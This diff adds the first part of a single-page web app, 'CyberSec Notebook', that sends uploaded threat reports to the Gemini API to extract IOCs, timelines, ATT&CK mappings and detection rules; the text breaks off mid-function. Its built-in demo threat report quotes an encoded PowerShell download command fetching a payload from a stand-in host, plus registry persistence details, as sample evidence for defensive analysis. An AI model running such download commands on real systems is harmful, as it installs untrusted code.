@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberSec Notebook</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: rgba(15, 23, 42, 1);
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: rgba(51, 65, 85, 1);
+            border-radius: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: rgba(71, 85, 105, 1);
+        }
+        .pattern-grid-lg {
+            background-image: linear-gradient(rgba(30, 41, 59, 0.5) 1px, transparent 1px), linear-gradient(90deg, rgba(30, 41, 59, 0.5) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+        
+        /* Utility classes for hiding/showing elements in Vanilla JS */
+        .hidden { display: none !important; }
+        
+        /* Keyframes used in Timeline */
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-1rem); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .animate-in-left {
+            animation: slideInLeft 0.5s ease-out forwards;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin-custom {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-300 font-sans overflow-x-auto overflow-y-hidden custom-scrollbar h-screen flex">
+
+    <!-- SIDEBAR -->
+    <div class="w-80 shrink-0 bg-slate-900 border-r border-slate-800 flex flex-col h-full z-10 shadow-xl">
+        <div class="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-900/50">
+            <div class="flex items-center gap-2">
+                <i data-lucide="cpu" class="text-blue-500 w-6 h-6"></i>
+                <h1 class="font-bold text-lg text-slate-100 tracking-tight">CyberSec<span class="text-blue-500">Node</span></h1>
+            </div>
+        </div>
+
+        <div class="flex-1 overflow-y-auto p-4 flex flex-col gap-4">
+            <div class="flex items-center justify-between">
+                <h2 class="text-xs font-semibold uppercase tracking-wider text-slate-500">Knowledge Base</h2>
+                <input type="file" multiple id="fileInput" class="hidden" accept=".txt,.json,.csv,.log,.md,.xml,.yml,.yaml,.rules,.conf">
+                <button id="addFileBtn" class="p-1 hover:bg-slate-800 rounded text-slate-400 hover:text-white transition-colors" title="Upload Files">
+                    <i data-lucide="plus" class="w-4 h-4"></i>
+                </button>
+            </div>
+
+            <!-- Empty State for Sidebar -->
+            <div id="sidebarEmptyState" class="text-center py-8 border-2 border-dashed border-slate-800 rounded-lg">
+                <i data-lucide="database" class="w-6 h-6 mx-auto text-slate-600 mb-2"></i>
+                <p class="text-sm text-slate-500 mb-4 px-4">Upload intelligence reports, logs, or alerts to build your workspace.</p>
+                <div class="flex flex-col gap-2 px-4">
+                    <button id="uploadFilesBtn" class="text-xs bg-blue-600 hover:bg-blue-500 text-white border border-blue-500 px-3 py-1.5 rounded transition-colors flex items-center justify-center gap-2">
+                        <i data-lucide="upload" class="w-3.5 h-3.5"></i> Upload Files
+                    </button>
+                    <button id="loadDemoBtn" class="text-xs bg-slate-800 hover:bg-slate-700 text-blue-400 border border-slate-700 px-3 py-1.5 rounded transition-colors">
+                        Load Demo Scenario
+                    </button>
+                </div>
+            </div>
+
+            <!-- Source List -->
+            <div id="sourceList" class="flex flex-col gap-2"></div>
+        </div>
+
+        <div class="p-4 border-t border-slate-800 bg-slate-900 flex flex-col gap-3">
+            <div class="flex flex-col gap-2 mb-1">
+                <label class="text-xs font-semibold text-slate-400 flex items-center gap-1.5">
+                    <i data-lucide="key" class="w-3.5 h-3.5"></i> Gemini API Key <span class="text-red-400">*</span>
+                </label>
+                <input type="password" id="apiKeyInput" placeholder="Enter API Key to begin" class="w-full bg-slate-950 border border-slate-700 rounded-md px-2.5 py-1.5 text-sm text-slate-200 focus:outline-none focus:border-blue-500">
+                
+                <label class="text-xs font-semibold text-slate-400 flex items-center gap-1.5 mt-2">
+                    <i data-lucide="box" class="w-3.5 h-3.5"></i> Model Selection
+                </label>
+                <select id="modelSelect" class="w-full bg-slate-950 border border-slate-700 rounded-md px-2.5 py-1.5 text-xs text-slate-400 focus:outline-none focus:border-blue-500 appearance-none mt-1">
+                    <!-- Set 2.5 Flash as the Stable Default -->
+                    <option value="gemini-2.5-flash" selected>gemini-2.5-flash (Stable / Default)</option>
+                    
+                    <!-- Next-Gen Models -->
+                    <option value="gemini-3.1-pro">gemini-3.1-pro</option>
+                    <option value="gemini-2.5-pro">gemini-2.5-pro</option>
+                    
+                    <!-- Experimental & Previous Models -->
+                    <option value="gemini-2.0-flash-exp">gemini-2.0-flash-exp</option>
+                    <option value="gemini-2.0-pro-exp-02-05">gemini-2.0-pro-exp-02-05</option>
+                    <option value="gemini-1.5-pro">gemini-1.5-pro</option>
+                    <option value="gemini-1.5-flash">gemini-1.5-flash</option>
+                    <option value="gemini-1.5-flash-8b">gemini-1.5-flash-8b</option>
+                </select>
+            </div>
+            <button id="analyzeBtn" disabled class="w-full py-2.5 rounded font-medium flex items-center justify-center gap-2 transition-all shadow-lg bg-slate-800 text-slate-500 cursor-not-allowed">
+                <i data-lucide="activity" class="w-4 h-4"></i> Extract Intelligence
+            </button>
+            <p id="analysisError" class="text-xs text-red-400 mt-2 text-center hidden"></p>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT AREA -->
+    <div class="flex-1 min-w-[600px] flex flex-col bg-[#0b1120]">
+        
+        <!-- Navigation Tabs -->
+        <div id="tabsContainer" class="flex items-center gap-1 p-2 border-b border-slate-800 bg-slate-900/50 overflow-x-auto custom-scrollbar shrink-0">
+            <!-- Tabs injected via JS -->
+        </div>
+
+        <!-- Tab Content Wrapper -->
+        <div class="flex-1 overflow-hidden relative w-full">
+            
+            <!-- TAB: Chat -->
+            <div id="tab-chat" class="h-full flex flex-col w-full tab-content">
+                <div id="chatHistory" class="flex-1 overflow-y-auto p-6 flex flex-col gap-6 custom-scrollbar">
+                    <!-- Chat messages injected here -->
+                </div>
+                <div class="p-4 border-t border-slate-800 bg-slate-900/50">
+                    <form id="chatForm" class="relative w-full flex gap-2">
+                        <input type="text" id="chatInput" placeholder="Upload sources first to ask questions." disabled class="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-4 py-3 pr-12 text-sm text-slate-200 focus:outline-none focus:border-blue-500 disabled:opacity-50 shadow-inner" autocomplete="off">
+                        <button type="submit" id="chatSubmitBtn" disabled class="absolute right-2 top-2 bottom-2 aspect-square flex items-center justify-center bg-blue-600 hover:bg-blue-500 disabled:bg-slate-800 disabled:text-slate-600 text-white rounded transition-colors">
+                            <i data-lucide="send" class="w-4 h-4"></i>
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- TAB: Summary -->
+            <div id="tab-summary" class="h-full overflow-y-auto p-6 custom-scrollbar tab-content hidden">
+                <div class="max-w-5xl mx-auto">
+                    <div class="flex items-center justify-between mb-8">
+                        <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="clipboard-list" class="text-blue-500 w-6 h-6"></i> Analyst Summary
+                        </h2>
+                    </div>
+                    <div id="summaryContent"></div>
+                </div>
+            </div>
+
+            <!-- TAB: Timeline -->
+            <div id="tab-timeline" class="h-full overflow-y-auto p-6 custom-scrollbar tab-content hidden">
+                <div class="max-w-4xl mx-auto">
+                    <div class="flex items-center justify-between mb-8">
+                        <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="clock" class="text-blue-500 w-6 h-6"></i> Incident Timeline
+                        </h2>
+                    </div>
+                    <div id="timelineContent"></div>
+                </div>
+            </div>
+
+            <!-- TAB: IOCs -->
+            <div id="tab-iocs" class="h-full overflow-y-auto p-6 custom-scrollbar tab-content hidden">
+                <div class="max-w-6xl mx-auto">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="shield" class="text-blue-500 w-6 h-6"></i> Extracted Indicators of Compromise
+                        </h2>
+                    </div>
+                    <div id="iocsContent"></div>
+                </div>
+            </div>
+
+            <!-- TAB: MITRE -->
+            <div id="tab-mitre" class="h-full overflow-y-auto p-6 custom-scrollbar tab-content hidden">
+                <div class="max-w-6xl mx-auto">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="activity" class="text-purple-500 w-6 h-6"></i> MITRE ATT&CK Mapping
+                        </h2>
+                    </div>
+                    <div id="mitreContent"></div>
+                </div>
+            </div>
+
+            <!-- TAB: Graph Viewer -->
+            <div id="tab-graph" class="h-full p-6 flex flex-col bg-slate-950 pattern-grid-lg tab-content hidden">
+                <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2 mb-6 shrink-0 z-10">
+                    <i data-lucide="network" class="text-emerald-500 w-6 h-6"></i> Investigation Entity Graph
+                </h2>
+                <div id="graphContent" class="flex-1 overflow-auto rounded-xl border border-slate-800 bg-slate-900/50 p-8 shadow-inner custom-scrollbar relative"></div>
+            </div>
+
+            <!-- TAB: Rules -->
+            <div id="tab-rules" class="h-full overflow-y-auto p-6 custom-scrollbar tab-content hidden">
+                <div class="max-w-6xl mx-auto">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="code" class="text-orange-500 w-6 h-6"></i> Generated Detection Rules
+                        </h2>
+                    </div>
+                    <div id="rulesContent"></div>
+                </div>
+            </div>
+
+            <!-- TAB: CVEs -->
+            <div id="tab-cves" class="h-full overflow-y-auto p-6 custom-scrollbar tab-content hidden">
+                <div class="max-w-6xl mx-auto">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-xl font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="alert-triangle" class="text-red-500 w-6 h-6"></i> Vulnerability Intelligence
+                        </h2>
+                    </div>
+                    <div id="cvesContent"></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // --- Application State ---
+        const state = {
+            sources: [],
+            activeTab: 'chat',
+            isProcessing: false,
+            summary: null,
+            timeline: [],
+            iocs: [],
+            mitre: [],
+            graphData: [],
+            cves: [],
+            rules: [],
+            chatHistory: [
+                { role: 'model', text: 'Welcome to CyberSec Notebook. Upload threat reports, logs, or evidence to begin analysis, or ask me a question about your ingested sources.' }
+            ],
+            isChatLoading: false
+        };
+
+        // --- Mock Data & Schemas ---
+        const DEMO_REPORT = `THREAT INTELLIGENCE REPORT - Incident #9921
+Date: 2026-06-20
+Summary: A suspicious sample was detected bypassing initial defenses. It appears to be a multi-stage dropper leveraging a known vulnerability to gain initial access, followed by execution of an encoded PowerShell script.
+
+File Analyzed: invoice_update_v2.exe
+SHA256: a3f4b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+
+Execution Flow:
+1. [08:12:05] The initial payload exploited CVE-2024-38014 (Windows Installer Elevation of Privilege) to gain SYSTEM privileges.
+2. [08:12:10] The executable created a persistence mechanism by modifying the registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater.
+3. [08:12:15] It dropped a secondary payload to C:\\Users\\Public\\temp_svc.exe.
+4. [08:13:00] The process executed the following PowerShell command to download an external component:
+   powershell.exe -ExecutionPolicy Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...
+   (Decoded: Invoke-WebRequest -Uri http://update-checker.xyz/payload.bin -OutFile C:\\Windows\\Temp\\payload.bin)
+5. [08:13:05] Network activity was observed communicating with IP 185.199.108.153 over port 443.
+
+Detection Engineering Notes:
+We need Sigma rules to catch this specific PowerShell download pattern and the registry run key modification.`;
+
+        const EXTRACTION_SCHEMA = {
+            type: "OBJECT",
+            properties: {
+                summary: {
+                    type: "OBJECT",
+                    properties: { threatLevel: { type: "STRING" }, malwareType: { type: "STRING" }, keyBehaviours: { type: "STRING" }, recommendedAction: { type: "STRING" } }
+                },
+                timeline: {
+                    type: "ARRAY",
+                    items: { type: "OBJECT", properties: { timestamp: { type: "STRING" }, event: { type: "STRING" }, description: { type: "STRING" } } }
+                },
+                iocs: {
+                    type: "ARRAY",
+                    items: { type: "OBJECT", properties: { type: { type: "STRING" }, value: { type: "STRING" }, source: { type: "STRING" }, risk: { type: "STRING" } } }
+                },
+                mitreMappings: {
+                    type: "ARRAY",
+                    items: { type: "OBJECT", properties: { evidence: { type: "STRING" }, tactic: { type: "STRING" }, technique: { type: "STRING" } } }
+                },
+                graph: {
+                    type: "ARRAY",
+                    items: { type: "OBJECT", properties: { source: { type: "STRING" }, relation: { type: "STRING" }, target: { type: "STRING" } } }
+                },
+                cves: {
+                    type: "ARRAY",
+                    items: { type: "OBJECT", properties: { id: { type: "STRING" }, status: { type: "STRING" }, inKEV: { type: "BOOLEAN" }, exploited: { type: "BOOLEAN" }, priority: { type: "STRING" } } }
+                },
+                rules: {
+                    type: "ARRAY",
+                    items: { type: "OBJECT", properties: { name: { type: "STRING" }, type: { type: "STRING" }, content: { type: "STRING" } } }
+                }
+            }
+        };
+
+        // --- Core Functions ---
+        const extractRegexIocs = (text) => {
+            const patterns = {
+                ip: /\b(?:\d{1,3}\.){3}\d{1,3}\b/g,
+                cve: /\bCVE-\d{4}-\d{4,7}\b/g,
+                sha256: /\b[a-fA-F0-9]{64}\b/g,
+                url: /https?:\/\/[^\s)]+/g,
+                registry: /HKCU\\[^\s]+|HKLM\\[^\s]+/g,
+                windowsPath: /[A-Z]:\\[^\n\r"]+/g,
+            };
+
+            const results = [];
+            Object.entries(patterns).forEach(([type, regex]) => {
+                const matches = text.match(regex) || [];
+                [...new Set(matches)].forEach(value => {
+                    results.push({
+                        type, value, source: "Regex extraction",
+                        risk: type === "ip" || type === "url" || type === "registry" ? "High" : "Medium"
+                    });
+                });
+            });
+            return results;
+        };
+
+        const callGeminiAPI = async (payload, retries = 5) => {
+            const customApiKey = document.getElementById('apiKeyInput').value;
+            const customModel = document.getElementById('modelSelect').value;
+
+            if (!customApiKey || customApiKey.trim() === "") {
+                throw new Error("API Key is missing. Please enter it in the sidebar.");
+            }
+            const keyToUse = customApiKey.trim(); 
+            const modelToUse = customModel || 'gemini-2.5-flash';
+            
+            const url = `https://generativelanguage.googleapis.com/v1beta/models/${modelToUse}:generateContent?key=${keyToUse}`;
+            const delays = [1000, 2000, 4000, 8000, 16000];
+
+            for (let i = 0; i < retries; i++) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                    return await response.json();
+                } catch (error) {
+                    if (i === retries - 1) throw error;
+                    await new Promise(resolve => setTimeout(resolve, delays[i]));
+                }
+            }
+        };
+
+        const copyToClipboard = (text) => {
+            try {
+                const textArea = document.createElement("textarea");
+                textArea.value = text;
+                textArea.style.top = "0";
+                textArea.style.left = "0";
+                textArea.style.position = "fixed";
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+            } catch (err) {
+                console.error('Failed to copy', err);
+            }
+        };
+
+        // --- Render Functions ---
+        function renderApp() {
+            renderSidebar();
+            renderTabs();
+            renderChatHistory();
+            renderSummary();
+            renderTimeline();
+            renderIocs();
+            renderMitre();
+            renderGraph();
+            renderRules();
+            renderCves();
+            
+            // Initialize lucide icons for newly added DOM elements
+            lucide.createIcons();
+        }
+
+        function renderSidebar() {
+            const emptyState = document.getElementById('sidebarEmptyState');
+            const sourceList = document.getElementById('sourceList');
+            const analyzeBtn = document.getElementById('analyzeBtn');
+            const analysisError = document.getElementById('analysisError');
+            const chatInput = document.getElementById('chatInput');
+
+            if (state.sources.length === 0) {
+                emptyState.classList.remove('hidden');
+                sourceList.innerHTML = '';
+                
+                analyzeBtn.disabled = true;
+                analyzeBtn.className = "w-full py-2.5 rounded font-medium flex items-center justify-center gap-2 transition-all shadow-lg bg-slate-800 text-slate-500 cursor-not-allowed";
+                
+                chatInput.disabled = true;
+                chatInput.placeholder = "Upload sources first to ask questions.";
+            } else {
+                emptyState.classList.add('hidden');
+                sourceList.innerHTML = state.sources.map(source => `
+                    <div class="group flex items-center justify-between bg-slate-900 border border-slate-800 hover:border-slate-700 p-2.5 rounded shadow-sm">
+                        <div class="flex items-center gap-2 overflow-hidden">
+                            <i data-lucide="file-text" class="text-slate-500 shrink-0 w-4 h-4"></i>
+                            <span class="text-sm truncate text-slate-300">${escapeHtml(source.name)}</span>
+                        </div>
+                        <button onclick="removeSource(${source.id})" class="opacity-0 group-hover:opacity-100 p-1 hover:text-red-400 text-slate-500 transition-all">
+                            <i data-lucide="trash-2" class="w-3.5 h-3.5"></i>
+                        </button>
+                    </div>
+                `).join('');
+
+                if (state.isProcessing) {
+                    analyzeBtn.disabled = true;
+                    analyzeBtn.className = "w-full py-2.5 rounded font-medium flex items-center justify-center gap-2 transition-all shadow-lg bg-blue-600/50 text-blue-200 cursor-wait";
+                    analyzeBtn.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin-custom"></i> Analyzing Sources...`;
+                } else {
+                    analyzeBtn.disabled = false;
+                    analyzeBtn.className = "w-full py-2.5 rounded font-medium flex items-center justify-center gap-2 transition-all shadow-lg bg-blue-600 hover:bg-blue-500 text-white shadow-blue-900/20";
+                    analyzeBtn.innerHTML = `<i data-lucide="activity" class="w-4 h-4"></i> Extract Intelligence`;
+                }
+                
+                chatInput.disabled = false;
+                chatInput.placeholder = "Ask a question about the uploaded evidence...";
+            }
+        }
+
+        function renderTabs() {
+            const tabs = [
+                { id: 'chat', label: 'Q&A Chat', icon: 'message-square' },
+                { id: 'summary', label: 'Summary', icon: 'clipboard-list' },
+                { id: 'timeline', label: 'Timeline', icon: 'clock', badge: state.timeline.length },
+                { id: 'iocs', label: 'IOCs', icon: 'shield', badge: state.iocs.length },
+                { id: 'mitre', label: 'ATT&CK', icon: 'activity', badge: state.mitre.length },
+                { id: 'graph', label: 'Investigation Graph', icon: 'network' },
+                { id: 'rules', label: 'Detection Rules', icon: 'code', badge: state.rules.length },
+                { id: 'cves', label: 'CVE Intelligence', icon: 'alert-triangle', badge: state.cves.length },
+            ];
+
+            const tabsContainer = document.getElementById('tabsContainer');
+            tabsContainer.innerHTML = tabs.map(tab => `
+                <button onclick="setActiveTab('${tab.id}')" class="flex items-center gap-2 px-4 py-2 text-sm font-medium rounded-t-lg transition-colors border-b-2 whitespace-nowrap ${state.activeTab === tab.id ? 'bg-slate-800/80 text-blue-400 border-blue-500' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 border-transparent'}">
+                    <i data-lucide="${tab.icon}" class="w-4 h-4"></i>
+                    ${tab.label}
+                    ${tab.badge > 0 ? `<span class="ml-1 bg-slate-700 text-slate-300 text-[10px] px-1.5 py-0.5 rounded-full">${tab.badge}</span>` : ''}
+                </button>
+            `).join('');
+
+            // Hide/Show tab contents
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            const activeEl = document.getElementById(`tab-${state.activeTab}`);
+            if (activeEl) activeEl.classList.remove('hidden');
+        }
+
+        function renderChatHistory() {
+            const container = document.getElementById('chatHistory');
+            const chatSubmitBtn = document.getElementById('chatSubmitBtn');
+            const chatInput = document.getElementById('chatInput');
+
+            container.innerHTML = state.chatHistory.map((msg, i) => `
+                <div class="flex gap-4 ${msg.role === 'user' ? 'justify-end' : 'justify-start'}">
+                    ${msg.role === 'model' ? `<div class="w-8 h-8 rounded bg-blue-900/50 border border-blue-800 flex items-center justify-center flex-shrink-0 mt-1"><i data-lucide="cpu" class="text-blue-400 w-4 h-4"></i></div>` : ''}
+                    <div class="max-w-[80%] rounded-lg p-4 shadow-sm ${msg.role === 'user' ? 'bg-slate-800 border border-slate-700 text-slate-200' : 'bg-slate-900/80 border border-slate-800 text-slate-300'}">
+                        <div class="whitespace-pre-wrap text-sm leading-relaxed">${escapeHtml(msg.text)}</div>
+                    </div>
+                    ${msg.role === 'user' ? `<div class="w-8 h-8 rounded bg-slate-800 border border-slate-700 flex items-center justify-center flex-shrink-0 mt-1"><span class="text-xs font-bold text-slate-400">ME</span></div>` : ''}
+                </div>
+            `).join('');
+
+            if (state.isChatLoading) {
+                container.innerHTML += `
+                    <div class="flex gap-4 justify-start">
+                        <div class="w-8 h-8 rounded bg-blue-900/50 border border-blue-800 flex items-center justify-center flex-shrink-0">
+                            <i data-lucide="loader-2" class="text-blue-400 w-4 h-4 animate-spin-custom"></i>
+                        </div>
+                        <div class="bg-slate-900/80 border border-slate-800 rounded-lg p-4 flex items-center gap-2">
+                            <span class="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></span>
+                            <span class="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style="animation-delay: 0.2s"></span>
+                            <span class="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style="animation-delay: 0.4s"></span>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            chatSubmitBtn.disabled = !chatInput.value.trim() || state.sources.length === 0 || state.isChatLoading;
+            if(chatSubmitBtn.disabled) {
+                chatSubmitBtn.className = "absolute right-2 top-2 bottom-2 aspect-square flex items-center justify-center disabled:bg-slate-800 disabled:text-slate-600 text-white rounded transition-colors";
+            } else {
+                chatSubmitBtn.className = "absolute right-2 top-2 bottom-2 aspect-square flex items-center justify-center bg-blue-600 hover:bg-blue-500 text-white rounded transition-colors";
+            }
+
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function createEmptyState(message) {
+            return `
+                <div class="flex flex-col items-center justify-center h-64 border-2 border-dashed border-slate-800 rounded-xl bg-slate-900/30">
+                    <i data-lucide="info" class="w-8 h-8 text-slate-600 mb-3"></i>
+                    <p class="text-slate-500">${message}</p>
+                </div>
+            `;
+        }
+
+        function renderSummary() {
+            const container = document.getElementById('summaryContent');
+            if (!state.summary) {
+                container.innerHTML = createEmptyState("No summary generated yet. Add sources and extract intelligence.");
+                return;
+            }
+            const s = state.summary;
+            const isHigh = s.threatLevel?.toLowerCase() === 'high' || s.threatLevel?.toLowerCase() === 'critical';
+            container.innerHTML = `
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="bg-slate-900 border border-slate-800 p-6 rounded-xl shadow-sm">
+                        <div class="text-xs text-slate-500 uppercase font-bold mb-2">Threat Level</div>
+                        <div class="text-2xl font-bold ${isHigh ? 'text-red-400' : 'text-orange-400'}">${escapeHtml(s.threatLevel)}</div>
+                    </div>
+                    <div class="bg-slate-900 border border-slate-800 p-6 rounded-xl shadow-sm">
+                        <div class="text-xs text-slate-500 uppercase font-bold mb-2">Likely Malware Type</div>
+                        <div class="text-slate-200 text-xl font-medium">${escapeHtml(s.malwareType)}</div>
+                    </div>
+                    <div class="bg-slate-900 border border-slate-800 p-6 rounded-xl shadow-sm md:col-span-2">
+                        <div class="text-xs text-slate-500 uppercase font-bold mb-2">Key Behaviours</div>
+                        <div class="text-slate-300 text-base leading-relaxed">${escapeHtml(s.keyBehaviours)}</div>
+                    </div>
+                    <div class="bg-slate-900 border border-slate-800 p-6 rounded-xl shadow-sm md:col-span-2">
+                        <div class="text-xs text-slate-500 uppercase font-bold mb-2">Recommended Action</div>
+                        <div class="text-slate-300 text-base leading-relaxed">${escapeHtml(s.recommendedAction)}</div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderTimeline() {
+            const container = document.getElementById('timelineContent');
+            if (state.timeline.length === 0) {
+                container.innerHTML = createEmptyState("No timeline events extracted yet. Add sources and extract intelligence.");
+                return;
+            }
+            container.innerHTML = `
+                <div class="relative border-l-2 border-slate-800 ml-4 space-y-8 pb-12">
+                    ${state.timeline.map((item, idx) => `
+                        <div class="relative pl-8 animate-in-left" style="animation-delay: ${idx * 100}ms">
+                            <div class="absolute -left-[9px] top-1.5 w-4 h-4 rounded-full bg-blue-600 border-4 border-[#0b1120]"></div>
+                            <div class="mb-2 inline-block px-2 py-0.5 bg-slate-900 border border-slate-800 text-xs font-bold text-blue-400 font-mono rounded shadow-sm">
+                                ${escapeHtml(item.timestamp)}
+                            </div>
+                            <h3 class="text-lg font-bold text-slate-200 mb-1">${escapeHtml(item.event)}</h3>
+                            <p class="text-sm text-slate-400 leading-relaxed bg-slate-900/50 p-3 rounded-lg border border-slate-800/50 shadow-inner">
+                                ${escapeHtml(item.description)}
+                            </p>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function renderIocs() {
+            const container = document.getElementById('iocsContent');
+            if (state.iocs.length === 0) {
+                container.innerHTML = createEmptyState("No IOCs extracted yet. Add sources and click Extract Intelligence.");
+                return;
+            }
+            container.innerHTML = `
+                <div class="bg-slate-900 border border-slate-800 rounded-lg overflow-hidden shadow-xl">
+                    <table class="w-full text-left text-sm">
+                        <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
+                            <tr>
+                                <th class="p-4 font-medium w-32">Type</th>
+                                <th class="p-4 font-medium">Value</th>
+                                <th class="p-4 font-medium">Source / Context</th>
+                                <th class="p-4 font-medium w-32">Risk Level</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-slate-800/50">
+                            ${state.iocs.map(ioc => {
+                                const r = ioc.risk?.toLowerCase();
+                                const badgeClass = r === 'high' ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 
+                                                 r === 'medium' ? 'bg-orange-500/10 text-orange-400 border border-orange-500/20' : 
+                                                 'bg-green-500/10 text-green-400 border border-green-500/20';
+                                return `
+                                <tr class="hover:bg-slate-800/50 transition-colors">
+                                    <td class="p-4 font-mono text-xs text-blue-400">${escapeHtml(ioc.type)}</td>
+                                    <td class="p-4 font-mono text-slate-300 bg-slate-950/30 rounded m-2 inline-block px-2 py-1 select-all break-all">${escapeHtml(ioc.value)}</td>
+                                    <td class="p-4 text-slate-400 text-xs">${escapeHtml(ioc.source)}</td>
+                                    <td class="p-4">
+                                        <span class="px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider ${badgeClass}">
+                                            ${escapeHtml(ioc.risk || 'Unknown')}
+                                        </span>
+                                    </td>
+                                </tr>`;
+                            }).join('')}
+                        </tbody>
+                    </table>
+                </div>
+            `;
+        }
+
+        function renderMitre() {
+            const container = document.getElementById('mitreContent');
+            if (state.mitre.length === 0) {
+                container.innerHTML = createEmptyState("No ATT&CK techniques mapped yet.");
+                return;
+            }
+            container.innerHTML = `
+                <div class="grid gap-4">
+                    ${state.mitre.map(item => `
+                        <div class="bg-slate-900 border border-slate-800 p-5 rounded-lg flex items-start gap-4 shadow-sm hover:border-purple-500/30 transition-colors">
+                            <div class="bg-purple-500/10 p-3 rounded-lg border border-purple-500/20 mt-1">
+                                <i data-lucide="activity" class="text-purple-400 w-5 h-5"></i>
+                            </div>
+                            <div class="flex-1">
+                                <div class="flex items-center gap-3 mb-2">
+                                    <span class="text-sm font-bold text-purple-400 uppercase tracking-wider">${escapeHtml(item.tactic)}</span>
+                                    <i data-lucide="chevron-right" class="text-slate-600 w-3.5 h-3.5"></i>
+                                    <span class="text-base font-semibold text-slate-200">${escapeHtml(item.technique)}</span>
+                                </div>
+                                <div class="bg-slate-950 border border-slate-800 rounded p-3 text-sm text-slate-400">
+                                    <span class="text-slate-500 font-medium mr-2">Evidence:</span> 
+                                    ${escapeHtml(item.evidence)}
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function renderGraph() {
+            const container = document.getElementById('graphContent');
+            if (state.graphData.length === 0) {
+                container.innerHTML = createEmptyState("No graph data extracted yet.");
+                container.classList.remove('p-8');
+                return;
+            }
+            container.classList.add('p-8');
+            container.innerHTML = `
+                <div class="flex flex-col gap-6 w-max mx-auto relative pt-4 pb-12">
+                    ${state.graphData.map(edge => `
+                        <div class="flex items-center gap-0">
+                            <div class="bg-slate-800 border-2 border-slate-700 px-4 py-2 rounded-lg min-w-[200px] text-center shadow-lg relative z-10">
+                                <span class="text-sm font-mono text-slate-300">${escapeHtml(edge.source)}</span>
+                            </div>
+                            <div class="flex flex-col items-center justify-center w-48 relative -mx-2 z-0">
+                                <div class="h-0.5 w-full bg-slate-700/50 absolute top-1/2 -translate-y-1/2 z-0"></div>
+                                <div class="bg-slate-950 border border-slate-800 px-3 py-1 rounded-full z-10 shadow">
+                                    <span class="text-[10px] uppercase font-bold text-emerald-400 tracking-wider">${escapeHtml(edge.relation)}</span>
+                                </div>
+                                <div class="absolute right-0 top-1/2 -translate-y-1/2 translate-x-1/2 text-slate-600">
+                                    <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                                </div>
+                            </div>
+                            <div class="bg-slate-800 border-2 border-slate-700 px-4 py-2 rounded-lg min-w-[200px] text-center shadow-lg relative z-10">
+                                <span class="text-sm font-mono text-blue-300">${escapeHtml(edge.target)}</span>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+                <div class="absolute bottom-4 left-4 bg-slate-900 border border-slate-800 p-3 rounded-lg flex items-start gap-2 max-w-sm">
+                    <i data-lucide="info" class="text-blue-400 mt-0.5 shrink-0 w-4 h-4"></i>
